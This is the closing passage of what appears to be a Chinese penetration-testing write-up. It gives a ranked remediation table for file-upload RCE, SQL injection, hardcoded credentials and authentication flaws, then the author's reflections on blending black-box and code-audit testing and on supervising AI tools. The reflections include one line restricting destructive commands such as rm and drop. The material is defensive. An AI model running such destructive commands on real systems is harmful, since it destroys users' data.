10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">任意文件上传致 RCE</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">统一上传白名单；上传目录设置为不可执行；建议使用独立文件存储服务</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">P0</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">SQL 注入（11处）</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">全面参数化查询改造；废弃 strWhere 拼接模式；引入 ORM 或参数化封装</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">P1</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">硬编码密钥与凭证</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">迁移至 KMS/环境变量；立即轮换已泄露密钥</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">P1</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">登录鉴权绕过</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">后端统一维护登录状态；所有敏感接口独立校验 Token</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">P2</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">未授权访问</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">所有接口接入统一鉴权中间件；敏感数据接口增加权限校验</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">P2</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">账号枚举</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">统一登录失败响应文案；增加登录速率限制和图形验证码</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">P2</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">修改密码无原密码校验</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">强制原密码验证；增加操作日志审计</span></section></td></tr></tbody></table>  
## 六、总结与思考  
  
这次渗透测试从黑盒到白盒，最终拿到 RCE，整个过程其实没有用什么高深的技术，更多的是耐心和逻辑推演。我想分享几点个人的感受，供正在学习渗透测试的师傅参考。  
  
**第一，黑盒和白盒要结合起来看。**  
 黑盒测试帮你快速定位系统的薄弱环节，比如未授权接口、逻辑绕过；但如果你想理解漏洞的根因，必须回到代码里。这次如果只做黑盒，我可能只能提交几个中高危的逻辑漏洞，止步于"修改密码不用原密码"这种层面。但拿到源码后，我才看到文件上传分支的遗漏、SQL 注入的架构性设计缺陷、硬编码的密钥。这些才是真正的致命伤。  
  
**第二，AI确实已经在改变我们的工作方式。**  
 这次审计从反编译到漏洞扫描，再到部分 POC 的验证，AI 都帮了大忙，效率比纯人工提升了不止一个量级。但我越来越觉得，越是在这种时候，越要保持清醒。AI 可以帮你快速覆盖代码、生成 Payload，但它对业务逻辑的理解是片面的，对真实环境的判断是有盲区的。所以我的习惯是：AI 输出的每一个高危结论，都必须经过人工复核和二次验证，特别是在交付客户之前，绝不能把 AI 的初筛结果直接当成最终报告。另外，在写提示词的时候，一定要给 AI 划定明确的边界，禁止它执行 **rm、drop**  
 这类破坏性操作，任何涉及写盘、删数据、改配置的命令，都必须人工确认后再执行。把 AI 当作一个高效的助手，而不是一个可以背锅的替罪羊，这样才能真正用好它。  
  
**第三，渗透测试的终点不是拿到 Shell。**  
 拿到 RCE 后，工作其实才刚刚开始。我们需要整理证据链，评估影响范围，给出可落地的修复方案，并帮助客户验证修复效果。对客户来说，一个能复现的 POC 和一份清晰的修复清单，远比一个 Shell 更有价值。  
  
希望这篇文章能给正在做渗透测试或代码审计的师傅带来一些启发。如果你有不同的思路或更好的工具推荐，欢迎在评论区交流。  
  
往期文章分享  
<table><tbody><tr><td data-colwidth="576"><section style="text-align: center;"><span leaf=""><a class="normal_text_link mp_article_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247491070&amp;idx=1&amp;sn=d96f606d73e75236ed3f096292df1c95&amp;scene=21#wechat_redirect" textvalue="学习干货 | 年薪25W！从传统自动化测试到大模型安全测试，粉丝分享真实的转型复盘笔记" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">学习干货 | 年薪25W！从传统自动化测试到大模型安全测试，粉丝分享真实的转型复盘笔记</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490966&amp;idx=1&amp;sn=51b7a3707bea82164e4a17334664afb9&amp;scene=21#wechat_redirect" textvalue="应急响应|客户勒索病毒中招 无安全设备下的五分钟极速溯源复盘" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应|客户勒索病毒中招 无安全设备下的五分钟极速溯源复盘</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490916&amp;idx=1&amp;sn=53a53484c5cb06c6616578d100479c3d&amp;scene=21#wechat_redirect" textvalue="渗透测试 | 近期高危逻辑漏洞挖掘实战合集 (越权漏洞 / 支付漏洞 / 账号接管)" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">渗透测试 | 近期高危逻辑漏洞挖掘实战合集 (越权漏洞 / 支付漏洞 / 账号接管)</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490796&amp;idx=1&amp;sn=530e948b5a69a079e668c08f186ae5ea&amp;scene=21#wechat_redirect" textvalue="学习干货|首发黑灰产靶场之恶意浏览器插件窃密与远控溯源复盘" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">学习干货|首发黑灰产靶场之恶意浏览器插件窃密与远控溯源复盘</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490761&amp;idx=1&amp;sn=18b35e5d6ef8f09cdc75f3a7ca4a42de&amp;scene=21#wechat_redirect" textvalue="网安话题 | 热门榜单答疑第一期：从AI大模型安全到行业发展探讨" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">网安话题 | 热门榜单答疑第一期：从AI大模型安全到行业发展探讨</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-indent: 0px;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490572&amp;idx=1&amp;sn=a519285fa5e16dcd3e01dc7b5cef2cbd&amp;scene=21#wechat_redirect" textvalue="学习干货 | 新手必练！真实复现DMZ区攻防场景与排查思路（附开源环境）" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">学习干货 | 新手必练！真实复现DMZ区攻防场景与排查思路（附开源环境）</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490451&amp;idx=1&amp;sn=4313bbf3307747f86b1ca4c043e860a7&amp;scene=21#wechat_redirect" textvalue="应急响应|全网首发！变种勒索病毒仿真靶场：从排查到解密(附开源训练环境)" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应|全网首发！变种勒索病毒仿真靶场：从排查到解密(附开源训练环境)</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490313&amp;idx=1&amp;sn=8dab7d5f2158f8368ab0d7df67e4bf01&amp;scene=21#wechat_redirect" textvalue="应急响应|记一次针对AIR勒索病毒的溯源过程" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应|记一次针对AIR勒索病毒的溯源过程</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490187&amp;idx=1&amp;sn=068b8c8dc7adf0dc2639412bff8b97c1&amp;scene=21#wechat_redirect" textvalue="学习干货|从网线到攻防，一起学习网络基础、安全原理与密码学知识！建议收藏" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">学习干货|从网线到攻防，一起学习网络基础、安全原理与密码学知识！建议收藏</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a 